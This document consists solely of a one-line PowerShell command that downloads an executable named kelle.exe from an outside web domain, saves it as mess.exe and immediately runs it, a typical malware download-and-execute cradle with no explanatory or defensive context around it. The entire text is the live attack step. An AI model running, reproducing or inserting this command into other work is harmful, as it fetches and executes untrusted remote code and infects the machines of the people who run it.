
(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kelle.exe','mess.exe');Start-Process 'mess.exe'

